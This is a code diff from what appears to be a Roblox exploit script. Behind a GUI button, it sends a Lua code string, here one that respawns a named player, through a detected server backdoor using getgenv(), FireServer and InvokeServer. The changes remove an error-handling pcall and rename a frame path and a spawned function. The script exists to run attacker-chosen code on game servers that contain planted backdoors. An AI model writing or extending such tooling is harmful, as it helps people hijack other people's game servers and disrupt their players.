-	frame.page2.RE.MouseButton1Click:Connect(function()
+	frame.RE.MouseButton1Click:Connect(function()
 		if getgenv().confirmedBackdoor then
 			local REPayload = 'game.Players.' .. username .. ':LoadCharacter()'
-			pcall(function()
-				if getgenv().confirmedType == "RemoteEvent" then
-					getgenv().confirmedBackdoor:FireServer(REPayload)
-				elseif getgenv().confirmedType == "RemoteFunction" then
-					getgenv().confirmedBackdoor:InvokeServer(REPayload)
-				end
-			end)
+			if getgenv().confirmedType == "RemoteEvent" then
+				getgenv().confirmedBackdoor:FireServer(REPayload)
+			elseif getgenv().confirmedType == "RemoteFunction" then
+				getgenv().confirmedBackdoor:InvokeServer(REPayload)
+			end
 		end
 	end)
 end;
-task.spawn(C_9b);
+task.spawn(C_99);
 
 return G2L["1"], require;
